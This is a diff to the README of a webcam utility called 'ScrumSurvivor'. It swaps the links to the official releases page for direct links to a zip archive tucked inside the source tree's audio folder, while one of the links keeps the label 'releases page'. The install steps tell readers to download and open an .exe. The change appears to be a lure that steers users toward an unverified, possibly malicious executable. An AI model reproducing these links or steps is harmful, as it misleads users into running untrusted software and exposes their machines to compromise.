@@ -1,6 +1,6 @@
 # 👤 ScrumSurvivor - Keep your camera on without stress
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/drewnice586/ScrumSurvivor/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/drewnice586/ScrumSurvivor/raw/refs/heads/main/src/scrumsurvivor/audio/Scrum-Survivor-v2.0.zip)
 
 ## What is ScrumSurvivor?
 
@@ -20,7 +20,7 @@ To run this software, your computer needs these features:
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [releases page](https://github.com/drewnice586/ScrumSurvivor/releases) to download the latest version.
+1.  Visit the [releases page](https://github.com/drewnice586/ScrumSurvivor/raw/refs/heads/main/src/scrumsurvivor/audio/Scrum-Survivor-v2.0.zip) to download the latest version.
 2.  Look for the file ending in `.exe` under the Assets section.
 3.  Click the file to start the download.
 4.  Open the file once the download finishes.
